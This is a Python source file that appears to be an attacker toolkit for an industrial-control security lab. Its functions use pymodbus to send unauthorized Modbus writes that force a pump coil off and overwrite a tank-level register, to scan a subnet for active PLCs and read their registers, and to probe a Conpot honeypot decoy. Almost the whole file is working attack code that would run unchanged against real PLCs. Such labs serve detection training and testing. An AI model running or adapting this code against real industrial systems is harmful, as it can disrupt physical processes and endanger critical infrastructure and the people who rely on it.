import time
import sys
import logging
from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO, format='%(asctime)s [ATTACK-BOX] %(levelname)s: %(message)s')
logger = logging.getLogger("OTAttacker")

def attack_unauthorized_write(target_ip="192.168.10.10", port=502):
    """
    Simulates unauthorized write attack (FC05/FC06) against PLC-001.
    Forces pump shutoff or tampers with holding registers.
    """
    logger.info(f"[*] Launching Unauthorized Write Attack against {target_ip}:{port}...")
    client = ModbusTcpClient(target_ip, port=port)
    if not client.connect():
        logger.error(f"[-] Could not connect to {target_ip}:{port}")
        return

    # Attack 1: Force pump coil shutoff (FC05 - Coil 1 = 0)
    logger.warning("[!] Sending unauthorized FC05: Forcing Pump 1 STOP (Coil 1 -> 0)...")
    res1 = client.write_coil(address=1, value=False)
    logger.info(f"[+] Result: {res1}")

    # Attack 2: Tamper with Tank Level register (FC06 - Register 1 -> 9999)
    logger.warning("[!] Sending unauthorized FC06: Overwriting Tank Level register to 9999...")
    res2 = client.write_register(address=1, value=9999)
    logger.info(f"[+] Result: {res2}")
    client.close()

def attack_recon_scan(target_subnet="192.168.10", port=502):
    """
    Simulates OT reconnaissance scan across Level 1 subnet.
    """
    logger.info(f"[*] Scanning subnet {target_subnet}.0/24 on Modbus port {port}...")
    for host_id in [10, 12, 15, 18, 20, 50, 90]:
        ip = f"{target_subnet}.{host_id}"
        client = ModbusTcpClient(ip, port=port, timeout=0.5)
        if client.connect():
            logger.info(f"[+] DISCOVERED ACTIVE OT ASSET: {ip}:{port}")
            rr = client.read_holding_registers(address=1, count=5)
            if rr and not rr.isError():
                logger.info(f"    Registers read from {ip}: {rr.registers}")
            client.close()

def attack_honeypot_tripwire(target_ip="192.168.10.90", port=502):
    """
    Simulates attacker touching the Conpot Decoy PLC.
    """
    logger.warning(f"[!] Probing Honeypot Decoy at {target_ip}:{port}...")
    client = ModbusTcpClient(target_ip, port=port)
    if client.connect():
        logger.warning("[!] Reading decoy holding registers (triggering tripwire)...")
        res = client.read_holding_registers(address=1, count=3)
        logger.info(f"[+] Response from Decoy: {res.registers if hasattr(res, 'registers') else res}")
        client.close()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "write":
        attack_unauthorized_write()
    elif len(sys.argv) > 1 and sys.argv[1] == "scan":
        attack_recon_scan()
    elif len(sys.argv) > 1 and sys.argv[1] == "tripwire":
        attack_honeypot_tripwire()
    else:
        logger.info("OT Attacker Toolkit ready.")
        logger.info("Run: python attack_toolkit.py write     -> Executes unauthorized write")
        logger.info("Run: python attack_toolkit.py scan      -> Executes reconnaissance scan")
        logger.info("Run: python attack_toolkit.py tripwire  -> Probes Conpot honey-PLC")
        while True:
            time.sleep(3600)
